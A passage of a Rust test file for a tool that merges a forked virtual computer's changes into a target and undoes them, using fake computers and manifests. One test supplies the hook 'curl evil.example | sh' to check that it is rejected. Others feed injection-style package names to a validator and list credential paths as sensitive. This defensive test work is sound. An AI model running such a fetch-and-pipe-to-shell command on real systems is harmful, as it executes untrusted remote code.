//! Keep and undo against fake computers. The fake interprets the tagged guest commands the
//! keep sends (`scripts.rs`), so these tests cover the order of the steps, what stops a
//! keep, and what a stopped, failed or interrupted keep leaves behind.

use std::{
    any::Any,
    collections::BTreeMap,
    io::Read,
    sync::{
        atomic::{AtomicUsize, Ordering},
        mpsc, Arc, Mutex,
    },
    time::Duration,
};

use super::{
    env::{CheckpointRef, ExecOut, GuestCmd, KeepEnv, Live, ManifestStore, Os, RunAs},
    journal::{Entry, Journal, State},
    plan::{self, Base, Decision},
    prepare, scripts, Answer, Hooks, Outcome, Request, Resumed, UndoOutcome,
};
use crate::changes::{diff::diff, ignore::IgnoreList, manifest::Manifest};

// ------------------------------------------------------------------ fake world

#[derive(Clone, Default, Debug)]
struct Comp {
    files: BTreeMap<String, (Vec<u8>, String)>,
    links: BTreeMap<String, String>,
    crontab: BTreeMap<String, String>,
    /// "manager name" -> version
    pkgs: BTreeMap<String, String>,
    pids: BTreeMap<String, u32>,
    merged: Vec<String>,
    hooks: Vec<String>,
    /// Branch names made in a repository.
    branches: Vec<String>,
}

struct World {
    os: Os,
    comps: Mutex<BTreeMap<String, Comp>>,
    snapshots: Mutex<Vec<(String, CheckpointRef, Comp)>>,
    log: Mutex<Vec<String>>,
    git_state: Mutex<String>,
    /// Paths the fork's commits change, as git lists them.
    changed_files: Mutex<Vec<String>>,
    fail_tag: Mutex<Option<&'static str>>,
    stuck: Mutex<bool>,
    gate: Mutex<Option<mpsc::Receiver<()>>>,
    entered: Mutex<Option<mpsc::Sender<()>>>,
    /// (computer, repo-relative path) -> "blob hash" as `git_file_state` prints it.
    file_states: Mutex<BTreeMap<(String, String), String>>,
    bad_dest: Mutex<Vec<String>>,
    brew: Mutex<String>,
    holds: AtomicUsize,
    /// Whether the lane was held when each tagged command ran.
    held_at: Mutex<Vec<(String, bool)>>,
    dirs: Mutex<Vec<String>>,
    /// Computers that are stopped; every other computer runs.
    stopped: Mutex<Vec<String>>,
    fail_start: Mutex<bool>,
    /// Reading a file from any computer fails.
    fail_read: Mutex<bool>,
}

impl World {
    fn new(os: Os, names: &[&str]) -> Arc<Self> {
        let mut comps = BTreeMap::new();
        for name in names {
            let mut comp = Comp::default();
            comp.pids.insert("web".into(), 100);
            comps.insert((*name).to_owned(), comp);
        }
        Arc::new(Self {
            os,
            comps: Mutex::new(comps),
            snapshots: Mutex::default(),
            log: Mutex::default(),
            git_state: Mutex::new("ff".into()),
            changed_files: Mutex::default(),
            fail_tag: Mutex::default(),
            stuck: Mutex::default(),
            gate: Mutex::default(),
            entered: Mutex::default(),
            file_states: Mutex::default(),
            bad_dest: Mutex::default(),
            brew: Mutex::new("1.7".into()),
            holds: AtomicUsize::new(0),
            held_at: Mutex::default(),
            dirs: Mutex::default(),
            stopped: Mutex::default(),
            fail_start: Mutex::default(),
            fail_read: Mutex::default(),
        })
    }

    fn with<R>(&self, name: &str, f: impl FnOnce(&mut Comp) -> R) -> R {
        f(self.comps.lock().unwrap().get_mut(name).unwrap())
    }

    fn last_scope(&self) -> String {
        self.snapshots
            .lock()
            .unwrap()
            .last()
            .unwrap()
            .1
            .scope
            .clone()
    }

    fn logged(&self, tag: &str) -> usize {
        self.log
            .lock()
            .unwrap()
            .iter()
            .filter(|l| l.split(':').nth(1) == Some(tag))
            .count()
    }

    fn order(&self, tags: &[&str]) -> Vec<String> {
        self.log
            .lock()
            .unwrap()
            .iter()
            .filter_map(|l| l.split(':').nth(1))
            .filter(|t| tags.contains(t))
            .map(str::to_owned)
            .collect()
    }

    fn put(&self, computer: &str, path: &str, text: &str) {
        self.with(computer, |c| {
            c.files
                .insert(path.to_owned(), (text.as_bytes().to_vec(), "644".into()))
        });
    }
}

struct Hold(Arc<World>);
impl Drop for Hold {
    fn drop(&mut self) {
        self.0.holds.fetch_sub(1, Ordering::SeqCst);
    }
}

struct Fake(Arc<World>);

fn hash(data: &[u8]) -> String {
    format!("c:{}", String::from_utf8_lossy(data))
}

impl KeepEnv for Fake {
    fn after_kept(&self, computer: &str) {
        self.0
            .log
            .lock()
            .unwrap()
            .push(format!("{computer}:after_kept"));
    }

    fn os(&self, _: &str) -> Result<Os, String> {
        Ok(self.0.os)
    }

    fn run(&self, computer: &str, _who: RunAs, cmd: &GuestCmd) -> Result<ExecOut, String> {
        let w = &self.0;
        w.log.lock().unwrap().push(format!(
            "{computer}:{}:{}",
            cmd.tag,
            cmd.args.first().map_or("", |a| a.1.as_str())
        ));
        w.held_at
            .lock()
            .unwrap()
            .push((cmd.tag.to_owned(), w.holds.load(Ordering::SeqCst) > 0));
        if *w.fail_tag.lock().unwrap() == Some(cmd.tag) {
            return Ok(ExecOut::failed(1, "boom"));
        }
        let out = match cmd.tag {
            "dest_check" => {
                let bad = w.bad_dest.lock().unwrap().clone();
                let paths =
                    String::from_utf8_lossy(cmd.stdin.as_deref().unwrap_or_default()).into_owned();
                let mut out = Vec::new();
                for p in paths.split('\0').filter(|p| !p.is_empty()) {
                    out.extend_from_slice(p.as_bytes());
                    out.push(0);
                    out.extend_from_slice(if bad.iter().any(|b| b == p) {
                        b"/root is a link"
                    } else {
                        b"ok"
                    });
                    out.push(0);
                }
                return Ok(ExecOut::ok(out));
            }
            "crontab_read" => w.with(computer, |c| {
                c.crontab.get(cmd.get("user")).cloned().unwrap_or_default()
            }),
            "crontab_write" => {
                let text =
                    String::from_utf8_lossy(cmd.stdin.as_deref().unwrap_or_default()).into_owned();
                w.with(computer, |c| {
                    c.crontab.insert(cmd.get("user").to_owned(), text)
                });
                String::new()
            }
            "file_remove" => {
                w.with(computer, |c| c.files.remove(cmd.get("path")));
                String::new()
            }
            "symlink" => {
                w.with(computer, |c| {
                    c.links
                        .insert(cmd.get("path").to_owned(), cmd.get("target").to_owned())
                });
                String::new()
            }
            "pkg_install" => {
                let manager = cmd.get("manager").to_owned();
                for spec in cmd.get("specs").lines() {
                    let (name, version) = spec
                        .split_once("==")
                        .or_else(|| spec.split_once('='))
                        .or_else(|| spec.split_once('@'))
                        .unwrap_or((spec, ""));
                    w.with(computer, |c| {
                        c.pkgs
                            .insert(format!("{manager} {name}"), version.to_owned())
                    });
                }
                String::new()
            }
            "pkg_remove" => {
                let manager = cmd.get("manager").to_owned();
                for name in cmd.get("specs").lines() {
                    w.with(computer, |c| c.pkgs.remove(&format!("{manager} {name}")));
                }
                String::new()
            }
            "brew_version" => w.brew.lock().unwrap().clone(),
            "git_bundle" => {
                w.with(computer, |c| {
                    c.files.insert(
                        cmd.get("bundle").to_owned(),
                        (b"bundle".to_vec(), "600".into()),
                    )
                });
                String::new()
            }
            "git_changed" => {
                let names = w.changed_files.lock().unwrap().clone();
                let mut out = Vec::new();
                for n in names {
                    out.extend_from_slice(n.as_bytes());
                    out.push(0);
                }
                return Ok(ExecOut::ok(out));
            }
            "git_precheck" => w.git_state.lock().unwrap().clone(),
            "git_merge" => {
                w.with(computer, |c| c.merged.push(cmd.get("repo").to_owned()));
                "abc1234\n".into()
            }
            "git_branch_plan" => {
                let wanted = cmd.get("name").to_owned();
                let mut name = wanted.clone();
                let mut n = 1;
                while w.with(computer, |c| c.branches.contains(&name)) {
                    n += 1;
                    name = format!("{wanted}-{n}");
                }
                format!("{name}\nnew\n")
            }
            "git_branch" => {
                w.with(computer, |c| c.branches.push(cmd.get("name").to_owned()));
                "abc1234\n".into()
            }
            "git_file_state" => w
                .file_states
                .lock()
                .unwrap()
                .get(&(computer.to_owned(), cmd.get("rel").to_owned()))
                .cloned()
                .unwrap_or_else(|| "- -".into()),
            "service_pid" => w
                .with(computer, |c| {
                    c.pids.get(cmd.get("name")).copied().unwrap_or(0)
                })
                .to_string(),
            "service_restart" => {
                if !*w.stuck.lock().unwrap() {
                    w.with(computer, |c| {
                        *c.pids.entry(cmd.get("name").to_owned()).or_insert(100) += 100
                    });
                }
                String::new()
            }
            "hook" => {
                if let Some(tx) = w.entered.lock().unwrap().take() {
                    let _ = tx.send(());
                    if let Some(rx) = w.gate.lock().unwrap().take() {
                        let _ = rx.recv_timeout(Duration::from_secs(10));
                    }
                }
                w.with(computer, |c| c.hooks.push(cmd.get("cmd").to_owned()));
                if cmd.get("cmd").contains("fail") {
                    return Ok(ExecOut::failed(2, "hook failed"));
                }
                String::new()
            }
            _ => String::new(),
        };
        Ok(ExecOut::ok(out))
    }

    fn inspect(&self, computer: &str, paths: &[String]) -> Result<BTreeMap<String, Live>, String> {
        let dirs = self.0.dirs.lock().unwrap().clone();
        let mut found = BTreeMap::new();
        for p in paths {
            let live = self.0.with(computer, |c| {
                if let Some(t) = c.links.get(p) {
                    Live::Link(t.clone())
                } else if let Some((d, m)) = c.files.get(p) {
                    if d == b"<unreadable>" {
                        Live::Unreadable
                    } else {
                        Live::File {
                            sha: hash(d),
                            mode: m.clone(),
                        }
                    }
                } else {
                    Live::Missing
                }
            });
            found.insert(p.clone(), if dirs.contains(p) { Live::Dir } else { live });
        }
        Ok(found)
    }

    fn read(&self, computer: &str, path: &str) -> Result<Vec<u8>, String> {
        if *self.0.fail_read.lock().unwrap() {
            return Err(format!("{path} could not be read"));
        }
        self.0
            .log
            .lock()
            .unwrap()
            .push(format!("{computer}:file_read:{path}"));
        self.0
            .with(computer, |c| c.files.get(path).map(|f| f.0.clone()))
            .ok_or_else(|| format!("{path} is missing"))
    }

    fn write(&self, computer: &str, path: &str, data: &[u8], mode: &str) -> Result<(), String> {
        self.0
            .log
            .lock()
            .unwrap()
            .push(format!("{computer}:file_write:{path}"));
        self.0.with(computer, |c| {
            c.files
                .insert(path.to_owned(), (data.to_vec(), mode.to_owned()))
        });
        Ok(())
    }

    fn checkpoint_before_keep(&self, computer: &str, name: &str) -> Result<CheckpointRef, String> {
        let mut snaps = self.0.snapshots.lock().unwrap();
        let reference = CheckpointRef {
            id: format!("cp{}", snaps.len() + 1),
            name: name.to_owned(),
            created_at: "t".into(),
            scope: if self.0.stopped.lock().unwrap().iter().any(|c| c == computer) {
                "disk"
            } else {
                "full"
            }
            .into(),
        };
        let state = self.0.comps.lock().unwrap().get(computer).unwrap().clone();
        snaps.push((computer.to_owned(), reference.clone(), state));
        self.0
            .log
            .lock()
            .unwrap()
            .push(format!("{computer}:checkpoint:{name}"));
        Ok(reference)
    }

    fn restore(&self, computer: &str, id: &str) -> Result<(), String> {
        self.0
            .held_at
            .lock()
            .unwrap()
            .push(("restore".into(), self.0.holds.load(Ordering::SeqCst) > 0));
        let state = self
            .0
            .snapshots
            .lock()
            .unwrap()
            .iter()
            .find(|s| s.1.id == id)
            .map(|s| s.2.clone())
            .ok_or("no such checkpoint")?;
        self.0
            .comps
            .lock()
            .unwrap()
            .insert(computer.to_owned(), state);
        self.0
            .log
            .lock()
            .unwrap()
            .push(format!("{computer}:restore:{id}"));
        // A restore leaves the computer stopped until it is started.
        let mut stopped = self.0.stopped.lock().unwrap();
        if !stopped.iter().any(|c| c == computer) {
            stopped.push(computer.to_owned());
        }
        Ok(())
    }

    fn start(&self, computer: &str) -> Result<(), String> {
        self.0
            .log
            .lock()
            .unwrap()
            .push(format!("{computer}:start:"));
        if *self.0.fail_start.lock().unwrap() {
            return Err("the memory could not be loaded.".into());
        }
        self.0.stopped.lock().unwrap().retain(|c| c != computer);
        Ok(())
    }

    fn hold(&self, computer: &str, _label: &str) -> Result<Box<dyn Any>, String> {
        self.0.log.lock().unwrap().push(format!("{computer}:hold:"));
        self.0.holds.fetch_add(1, Ordering::SeqCst);
        Ok(Box::new(Hold(self.0.clone())))
    }
}

// ------------------------------------------------------------------ fake store

struct Store {
    base: String,
    manifests: BTreeMap<String, String>,
    /// What the second capture of the fork returns, when it moved.
    fork_later: Option<String>,
    fork_captures: AtomicUsize,
    /// What main's later captures return, when it moved after the first.
    main_later: Option<String>,
    main_captures: AtomicUsize,
}

impl ManifestStore for Store {
    fn fork_time(&self, _: &str) -> Result<String, String> {
        Ok(self.base.clone())
    }
    fn capture(&self, computer: &str) -> Result<String, String> {
        if computer == "fork" {
            let n = self.fork_captures.fetch_add(1, Ordering::SeqCst);
            if n >= 1 {
                if let Some(later) = &self.fork_later {
                    return Ok(later.clone());
                }
            }
        }
        if computer == "main" {
            // The first two are the look ahead and the one taken before the checkpoint.
            let n = self.main_captures.fetch_add(1, Ordering::SeqCst);
            if n >= 2 {
                if let Some(later) = &self.main_later {
                    return Ok(later.clone());
                }
            }
        }
        self.manifests
            .get(computer)
            .cloned()
            .ok_or_else(|| "not captured".into())
    }
    fn source(&self, _: &str) -> Result<Option<String>, String> {
        Ok(Some("main".into()))
    }
}

fn mt(text: &str) -> String {
    format!("META\tformat\t2\nMETA\thome\t/root\n{text}")
}

fn m(text: &str) -> Manifest {
    Manifest::parse(&mt(text)).unwrap()
}

fn fixture(name: &str) -> Manifest {
    let path = format!(
        "{}/src/changes/fixtures/{name}.tsv.gz",
        env!("CARGO_MANIFEST_DIR")
    );
    let bytes = std::fs::read(&path).unwrap();
    let mut text = String::new();
    flate2::read::GzDecoder::new(&bytes[..])
        .read_to_string(&mut text)
        .unwrap();
    Manifest::parse(&text).unwrap()
}

fn store(base: &str, fork: &str, main: &str) -> Store {
    Store {
        base: mt(base),
        manifests: BTreeMap::from([("fork".to_owned(), mt(fork)), ("main".to_owned(), mt(main))]),
        fork_later: None,
        fork_captures: AtomicUsize::new(0),
        main_later: None,
        main_captures: AtomicUsize::new(0),
    }
}

fn request(hooks: Hooks) -> Request {
    Request {
        fork: "fork".into(),
        target: Some("main".into()),
        hooks,
        ..Request::default()
    }
}

fn journal() -> (tempfile::TempDir, Journal) {
    let dir = tempfile::tempdir().unwrap();
    let journal = Journal::new(dir.path().join("keep"));
    (dir, journal)
}

const WAIT: Duration = Duration::from_secs(5);

fn run(
    world: &Arc<World>,
    st: &Store,
    journal: &Journal,
    req: &Request,
) -> Result<Outcome, String> {
    super::keep(&Fake(world.clone()), st, journal, req, WAIT)
}

fn refused(outcome: Outcome) -> super::Refusal {
    match outcome {
        Outcome::Refused { refusal, .. } => refusal,
        other => panic!("expected a refusal, got {other:?}"),
    }
}

// ------------------------------------------------------------------ the planner

#[test]
fn the_recorded_cli_tools_task_plans_its_packages_files_and_commits() {
    let (base, fork) = (fixture("l3.parent"), fixture("l3.fork"));
    let changes = diff(&base, &fork, None, &IgnoreList::builtin());
    let plan = plan::build(
        &changes,
        &base,
        &fork,
        &base,
        Os::Linux,
        &Request::default(),
    );
    assert!(plan.conflicts.is_empty(), "{:?}", plan.conflicts);
    let mut names: Vec<_> = plan
        .packages
        .iter()
        .map(|p| (p.manager.as_str(), p.name.as_str()))
        .collect();
    names.sort();
    assert_eq!(names, [("dpkg", "jq"), ("dpkg", "ripgrep")]);
    assert!(plan
        .file_cands
        .iter()
        .any(|c| c.path == "/root/.bashrc" && matches!(c.base, Base::File(_))));
    assert_eq!(plan.repos.len(), 1);
    assert_eq!(plan.repos[0].repo, "/root/app");
    assert!(plan.repos[0].commits.is_some());
    assert!(plan.repos[0].base_head.is_some());
    // The plan names the dependencies the managers will bring.
    assert!(
        plan.summary().iter().any(|l| l.contains("dependencies")),
        "{:?}",
        plan.summary()
    );
}

fn file(sha: &str, mode: &str) -> Live {
    Live::File {
        sha: sha.into(),
        mode: mode.into(),
    }
}

#[test]
fn the_three_way_rule() {
    let base = Base::File("c:old".into());
    // Main unchanged: the fork's edit goes in.
    assert_eq!(
        plan::decide(&base, &file("c:new", "644"), &file("c:old", "644")),
        Decision::Write
    );
    // Main changed, the fork ended elsewhere: a conflict.
    assert!(matches!(
        plan::decide(&base, &file("c:new", "644"), &file("c:other", "644")),
        Decision::Conflict(_)
    ));
    // Both ended the same: nothing to do. Same bytes, other mode: the mode is carried.
    assert_eq!(
        plan::decide(&base, &file("c:new", "644"), &file("c:new", "644")),
        Decision::Skip
    );
    assert_eq!(
        plan::decide(&base, &file("c:new", "755"), &file("c:new", "644")),
        Decision::Write
    );
    // A file only the fork has; a delete main has not touched; a delete main edited.
    assert_eq!(
        plan::decide(&Base::Missing, &file("c:x", "644"), &Live::Missing),
        Decision::Write
    );
    assert_eq!(
        plan::decide(&base, &Live::Missing, &file("c:old", "644")),
        Decision::Write
    );
    assert!(matches!(
        plan::decide(&base, &Live::Missing, &file("c:edited", "644")),
        Decision::Conflict(_)
    ));
    // A file the collector did not hash is never taken as unchanged.
    assert!(matches!(
        plan::decide(
            &Base::File("-".into()),
            &file("c:new", "644"),
            &file("c:anything", "644")
        ),
        Decision::Conflict(_)
    ));
    // Unreadable is a conflict, never "identical".
    assert!(matches!(
        plan::decide(&base, &Live::Unreadable, &Live::Unreadable),
        Decision::Conflict(_)
    ));
    // Links compare by target.
    assert_eq!(
        plan::decide(
            &Base::Link("a".into()),
            &Live::Link("b".into()),
            &Live::Link("a".into())
        ),
        Decision::Write
    );
    assert!(matches!(
        plan::decide(
            &Base::Link("a".into()),
            &Live::Link("b".into()),
            &Live::Link("c".into())
        ),
        Decision::Conflict(_)
    ));
}

#[test]
fn an_uncommitted_file_is_judged_against_the_blob_at_the_fork_point() {
    assert_eq!(plan::decide_dirty("b1", "f2", "b1"), Decision::Write);
    assert!(matches!(
        plan::decide_dirty("b1", "f2", "m3"),
        Decision::Conflict(_)
    ));
    assert_eq!(plan::decide_dirty("b1", "f2", "f2"), Decision::Skip);
    // A delete of a file main left alone, and of one main edited.
    assert_eq!(plan::decide_dirty("b1", "-", "b1"), Decision::Write);
    assert!(matches!(
        plan::decide_dirty("b1", "-", "m3"),
        Decision::Conflict(_)
    ));
    // New in the fork; main has its own file there.
    assert!(matches!(
        plan::decide_dirty("-", "f2", "m3"),
        Decision::Conflict(_)
    ));
}

#[test]
fn package_names_and_versions_are_checked_before_a_manager_sees_them() {
    for bad in ["-rf", "a b", "x;y", "../x", "a\nb", ""] {
        assert!(!scripts::valid_package_word(bad, false), "{bad:?}");
    }
    assert!(scripts::valid_package_word("libjq1:arm64", false));
    assert!(scripts::valid_package_word("@types/node", true));
    assert!(!scripts::valid_package_word("@types/node", false));
    let base = m("");
    let fork = m("PKG\tdpkg\t-evil\t1.0\nPKGM\tdpkg\t-evil\n");
    let changes = diff(&base, &fork, None, &IgnoreList::builtin());
    let plan = plan::build(
        &changes,
        &base,
        &fork,
        &base,
        Os::Linux,
        &Request::default(),
    );
    assert!(plan.packages.is_empty());
    assert_eq!(plan.conflicts[0].kind, "package");
}

#[test]
fn a_package_main_changed_since_the_fork_is_a_conflict_and_a_removal_is_three_way() {
    let base = m("PKG\tdpkg\tjq\t1.6\nPKG\tdpkg\told\t1\nPKGM\tdpkg\tjq\nPKGM\tdpkg\told\n");
    let fork = m("PKG\tdpkg\tjq\t1.7\nPKGM\tdpkg\tjq\n");
    let main = m("PKG\tdpkg\tjq\t1.5\nPKG\tdpkg\told\t1\nPKGM\tdpkg\tjq\nPKGM\tdpkg\told\n");
    let changes = diff(&base, &fork, None, &IgnoreList::builtin());
    let plan = plan::build(
        &changes,
        &base,
        &fork,
        &main,
        Os::Linux,
        &Request::default(),
    );
    assert_eq!(plan.conflicts.len(), 1);
    assert_eq!(plan.conflicts[0].item, "dpkg jq");
    assert_eq!(
        plan.removals
            .iter()
            .map(|p| p.name.as_str())
            .collect::<Vec<_>>(),
        ["old"]
    );
    let main_edited = m("PKG\tdpkg\tjq\t1.6\nPKG\tdpkg\told\t2\nPKGM\tdpkg\tjq\nPKGM\tdpkg\told\n");
    let plan = plan::build(
        &changes,
        &base,
        &fork,
        &main_edited,
        Os::Linux,
        &Request::default(),
    );
    assert!(plan.removals.is_empty());
    assert!(plan.conflicts.iter().any(|c| c.item == "dpkg old"));
}

#[test]
fn migration_files_are_folders_and_files_not_any_path_with_the_word() {
    assert!(prepare::is_migration("db/migrations/001.sql"));
    assert!(prepare::is_migration("alembic/versions/1.py"));
    assert!(!prepare::is_migration("docs/migration-guide.md"));
    assert!(!prepare::is_migration("src/migrate.rs"));
}

#[test]
fn credentials_env_files_and_ignored_paths_are_sensitive_but_examples_are_not() {
    for p in [
        ".env",
        "app/.env.local",
        "home/.ssh/id_rsa",
        "x/server.pem",
        "node_modules/a/b.js",
        "run.log",
    ] {
        assert!(prepare::sensitive_path(p), "{p}");
    }
    for p in ["src/main.rs", ".env.example", "README.md"] {
        assert!(!prepare::sensitive_path(p), "{p}");
    }
}

#[test]
fn macos_system_folders_are_addressed_by_their_real_place() {
    assert_eq!(
        scripts::normalize(Os::Macos, "/etc/hosts"),
        "/private/etc/hosts"
    );
    assert_eq!(scripts::normalize(Os::Macos, "/Users/a/x"), "/Users/a/x");
    assert_eq!(scripts::normalize(Os::Linux, "/etc/hosts"), "/etc/hosts");
}

#[test]
fn inspect_records_survive_newlines_and_empty_values() {
    let mut bytes = Vec::new();
    for field in [
        "/a\nb", "F", "644", "abc", "/last", "L", "-", "target", "/gone", "X", "-", "-",
    ] {
        bytes.extend_from_slice(field.as_bytes());
        bytes.push(0);
    }
    let parsed = super::env::parse_inspect(&bytes);
    assert_eq!(parsed["/a\nb"], file("abc", "644"));
    assert_eq!(parsed["/last"], Live::Link("target".into()));
    assert_eq!(parsed["/gone"], Live::Missing);
    let pairs = scripts::parse_pairs(b"/x\0ok\0/y\0no\0");
    assert_eq!(pairs.len(), 2);
}

// ------------------------------------------------------------------ keeps

const BASE: &str = "F\t/root/.bashrc\t10\t1\tc:old\nGIT\t/root/app\taaa\tmain\t0\t0\nDB\tpostgres\tapp\tschema\ts1\nPKG\tdpkg\tjq\t1.6\nPKGM\tdpkg\tjq\n";
const FORK: &str = "F\t/root/.bashrc\t12\t2\tbb\nGIT\t/root/app\tbbb\tmain\t0\t0\nDB\tpostgres\tapp\tschema\ts2\nPKG\tdpkg\tjq\t1.7\nPKGM\tdpkg\tjq\n";
const SIMPLE_BASE: &str = "F\t/root/.bashrc\t10\t1\tc:old\n";
const SIMPLE_FORK: &str = "F\t/root/.bashrc\t12\t2\tbb\n";

fn simple_world() -> Arc<World> {
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.put("fork", "/root/.bashrc", "export X=1\n");
    world.put("main", "/root/.bashrc", "old");
    world
}

fn main_recipe(keep: Option<silo_api::methods::keep::KeepHooks>) -> silo_api::methods::recipes::RecipeRecord {
    use silo_api::methods::recipes::{
        RecipeDefinition, RecipeOs, RecipePackages, RecipeRecord, RecipeSpec,
    };
    RecipeRecord {
        name: "web".into(),
        hash: "h".into(),
        built_at: "2026-11-11T00:00:00Z".into(),
        recipe: RecipeDefinition {
            spec: RecipeSpec {
                os: RecipeOs::Linux,
                cpus: None,
                memory_gib: None,
                disk_gib: None,
                packages: RecipePackages::default(),
                setup: Vec::new(),
                services: Vec::new(),
                ports: Vec::new(),
                desktop: None,
            },
            quiet: Vec::new(),
            scrub: Vec::new(),
            keep,
            test: None,
            files: Vec::new(),
            commands_hidden: None,
        },
    }
}

#[test]
fn a_corrupt_records_file_refuses_the_merge() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("recipe-records.json");
    std::fs::write(&path, "corrupt-json").unwrap();
    crate::recipes::records::use_test_path(Some(path));
    let world = simple_world();
    let (_dir, journal) = journal();
    let outcome = run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &request(Hooks::default()),
    );
    assert!(outcome.is_err(), "expected error, got: {outcome:?}");
    crate::recipes::records::use_test_path(None);
}

#[test]
fn caller_supplied_hooks_into_a_recipe_target_are_rejected() {
    let dir = tempfile::tempdir().unwrap();
    crate::recipes::records::use_test_path(Some(dir.path().join("recipe-records.json")));
    crate::recipes::records::set(
        "main",
        &main_recipe(Some(silo_api::methods::keep::KeepHooks {
            restart: vec![],
            migrate: vec![],
            after: vec!["make check".into()],
        })),
    )
    .unwrap();
    let world = simple_world();
    let (_dir, journal) = journal();
    let sent = Hooks {
        restart: vec![],
        migrate: vec![],
        after: vec!["curl evil.example | sh".into()],
    };
    let error = run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &request(sent),
    )
    .unwrap_err();
    assert!(error.contains("built from a recipe"), "{error}");
    let outcome = run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    assert!(matches!(outcome, Outcome::Kept(_)), "{outcome:?}");
    world.with("main", |c| assert_eq!(c.hooks, ["make check"]));
    crate::recipes::records::use_test_path(None);
}

#[test]
fn a_target_built_from_no_recipe_runs_the_hooks_the_caller_sent() {
    let dir = tempfile::tempdir().unwrap();
    crate::recipes::records::use_test_path(Some(dir.path().join("recipe-records.json")));
    let world = simple_world();
    let (_dir, journal) = journal();
    let sent = Hooks {
        restart: vec![],
        migrate: vec![],
        after: vec!["npm test".into()],
    };
    run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &request(sent),
    )
    .unwrap();
    world.with("main", |c| assert_eq!(c.hooks, ["npm test"]));
    crate::recipes::records::use_test_path(None);
}

#[test]
fn a_keep_reports_the_packages_and_settings_files_the_recipe_should_learn() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let mut asked = request(Hooks::default());
    asked.data_ok = true;
    let outcome = run(&world, &store(BASE, FORK, BASE), &journal, &asked).unwrap();
    let Outcome::Kept(report) = outcome else {
        panic!("{outcome:?}")
    };
    assert_eq!(report.additions.packages["apt"], ["jq"]);
    assert_eq!(report.additions.files, ["/root/.bashrc"]);
}

/// A recipe `web` saved in a temporary app folder and `main` built from it.
fn recipe_world() -> (tempfile::TempDir, crate::recipes::Library) {
    let dir = tempfile::tempdir().unwrap();
    crate::recipes::records::use_test_path(Some(dir.path().join("recipe-records.json")));
    let record = main_recipe(None);
    let library = crate::recipes::Library::new(dir.path());
    library.save("web", &record.recipe).unwrap();
    crate::recipes::records::set("main", &record).unwrap();
    (dir, library)
}

#[test]
fn undoing_a_keep_takes_back_what_it_added_to_the_recipes() {
    let (app, library) = recipe_world();
    let world = simple_world();
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let mut st = store(BASE, FORK, BASE);
    let mut asked = request(Hooks::default());
    asked.data_ok = true;
    let mut outcome = run(&world, &st, &journal, &asked).unwrap();
    st.manifests
        .insert("main".into(), mt("F\t/root/.bashrc\t12\t2\tbb\n"));
    let Outcome::Kept(report) = &mut outcome else {
        panic!("{outcome:?}")
    };
    super::service::note_recipe(app.path(), &journal, report, true);
    assert!(report.recipe.is_some());
    let record = crate::recipes::records::get("main").unwrap().unwrap();
    assert_eq!(record.recipe.spec.packages.apt, ["jq"]);
    assert_eq!(record.recipe.files, ["/root/.bashrc"]);
    assert_eq!(
        library.saved("web").unwrap().unwrap().spec.packages.apt,
        ["jq"]
    );

    let mut undone = super::undo(&env, &st, &journal, "main", WAIT).unwrap();
    super::service::undo_recipe(app.path(), &journal, &mut undone);
    let UndoOutcome::Undone { notes, .. } = &undone else {
        panic!("{undone:?}")
    };
    assert!(notes.is_empty(), "{notes:?}");
    let record = crate::recipes::records::get("main").unwrap().unwrap();
    assert!(record.recipe.spec.packages.apt.is_empty());
    assert!(record.recipe.files.is_empty());
    let saved = library.saved("web").unwrap().unwrap();
    assert!(saved.spec.packages.apt.is_empty());
    assert!(saved.files.is_empty());
    crate::recipes::records::use_test_path(None);
}

#[test]
fn undoing_a_keep_that_changed_no_recipe_leaves_the_recipes_alone() {
    let (app, library) = recipe_world();
    let mut saved = library.saved("web").unwrap().unwrap();
    saved.spec.packages.apt.push("jq".into());
    library.save("web", &saved).unwrap();
    let world = simple_world();
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let mut st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    st.manifests
        .insert("main".into(), mt("F\t/root/.bashrc\t12\t2\tbb\n"));
    run(&world, &st, &journal, &request(Hooks::default())).unwrap();
    let mut undone = super::undo(&env, &st, &journal, "main", WAIT).unwrap();
    super::service::undo_recipe(app.path(), &journal, &mut undone);
    assert_eq!(library.saved("web").unwrap().unwrap(), saved);
    crate::recipes::records::use_test_path(None);
}

#[test]
fn a_journal_written_before_recipe_updates_were_recorded_still_loads() {
    let (_dir, journal) = journal();
    let target = "main";
    std::fs::create_dir_all(_dir.path().join("keep")).unwrap();
    std::fs::write(
        _dir.path().join("keep").join("main.checkpoints.json"),
        r#"[{"checkpoint":{"id":"cp1","name":"before-keep","created_at":"","scope":"full"},"state":"undoable"}]"#,
    )
    .unwrap();
    assert_eq!(journal.latest_undoable(target).unwrap().id, "cp1");
    assert_eq!(journal.recipe_update(target, "cp1"), None);
}

#[test]
fn a_plain_keep_runs_in_order_migrates_and_restarts_with_new_process_ids() {
    let world = simple_world();
    *world.changed_files.lock().unwrap() =
        vec!["src/a.js".into(), "migrations/002_users.sql".into()];
    let (_dir, journal) = journal();
    let hooks = Hooks {
        restart: vec!["web".into()],
        migrate: vec!["npm run migrate".into()],
        after: vec!["npm test".into()],
    };
    let outcome = run(&world, &store(BASE, FORK, BASE), &journal, &request(hooks)).unwrap();
    let Outcome::Kept(report) = outcome else {
        panic!("{outcome:?}")
    };
    assert_eq!(report.checkpoint.as_deref(), Some("cp1"));
    assert!(report.review_digest.is_some());
    // The target's own computer-use approval is applied again once the keep is in.
    assert_eq!(world.logged("after_kept"), 1);
    assert_eq!(
        world.order(&[
            "checkpoint",
            "hold",
            "pkg_install",
            "git_merge",
            "hook",
            "service_restart"
        ]),
        [
            "checkpoint",
            "hold",
            "pkg_install",
            "git_merge",
            "hook",
            "service_restart",
            "hook"
        ]
    );
    assert!(
        report
            .steps
            .iter()
            .any(|s| s == "restart web: pid 100 -> 200"),
        "{:?}",
        report.steps
    );
    world.with("main", |c| {
        assert_eq!(c.pkgs.get("dpkg jq").map(String::as_str), Some("1.7"));
